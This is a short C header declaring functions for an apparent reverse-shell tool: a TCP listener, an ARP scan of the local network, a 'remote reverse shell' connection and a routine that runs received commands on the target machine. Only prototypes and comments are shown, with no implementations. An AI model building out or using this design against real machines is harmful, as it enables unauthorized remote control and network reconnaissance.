#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

// #define PORT 4444
#define AES_KEY_SIZE 32
#define NotFoundErr "Command not found!\nEOF!\n"

// setup TCP listener on given port and wait for conns
int setup_listener(int port);

// prints out the usage statement if there is not enough args
void usage();

// runs the shell for listener
void shell(int);

// run a go binary used to arp scan local net to choose from the devices
void scan();

// connect to the given IP on given port as a remote reverse shell
int conn(const char *, const int);

// listen for sent commands on given socket and execute them on target machine
void execute_comms(int);
